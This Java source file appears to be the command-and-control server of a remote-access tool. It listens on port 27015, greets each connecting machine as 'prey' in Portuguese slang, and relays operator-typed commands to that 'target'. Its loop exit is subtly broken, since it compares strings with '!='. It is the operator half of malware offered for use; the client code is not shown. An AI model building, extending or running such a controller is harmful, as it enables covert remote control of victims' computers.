package main;

import main.network.ClientConnection;
import main.network.Connection;
import main.network.Message;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

import static main.utils.ServerUtils.startOnNewThread;

public class Server {

    private static ServerSocket serverSocket;

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        try {
            serverSocket = new ServerSocket(27015);
            System.out.println("Podipa vamo esperar o gatao entrar");
            Socket clientSocket = serverSocket.accept();

            System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress());

            Connection targetConnection = new Connection(clientSocket);

            runHandlerThread(targetConnection);

            String command;
            do {
                command = sc.nextLine();
                if (!isNullOrEmpty(command)) {
                    targetConnection.sendMessage(new Message(command));
                }
            } while (command != "quit");


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void runHandlerThread(Connection targetConnection) {
        startOnNewThread(new ClientConnection(targetConnection));
    }

    private static boolean isNullOrEmpty(String command) {
        return command == null || command.isEmpty();
    }


}
